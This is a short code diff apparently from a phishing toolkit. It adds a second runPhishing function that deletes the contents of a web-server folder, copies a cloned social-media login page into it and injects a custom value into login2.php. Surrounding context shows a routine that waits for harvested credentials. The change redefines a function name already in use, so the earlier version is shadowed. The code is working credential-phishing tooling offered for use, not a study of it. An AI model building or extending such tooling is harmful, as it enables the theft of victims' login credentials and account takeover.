@@ -35,7 +35,20 @@ def runPhishing(social, custom):
     f = open('base/Server/www/login.php', 'w')
     f.write(c)
     f.close()
-
+	
+def runPhishing(social, custom2):
+    global _social
+    _social = social
+    os.system('rm -Rf base/Server/www/*.* && touch base/Server/www/cat.txt')   
+    command = 'cp base/WebPages/%s/*.* base/Server/www/' % social.lower()
+    os.system(command)
+    with open('base/Server/www/login2.php') as f:
+        read_data = f.read()   
+    c = read_data.replace('<CUST0M2>', custom2)
+    f = open('base/Server/www/login2.php', 'w')
+    f.write(c)
+    f.close()
+	
 def waitCreds():
     print(cyan(" [*] Waiting for credentials... "))
     while True:
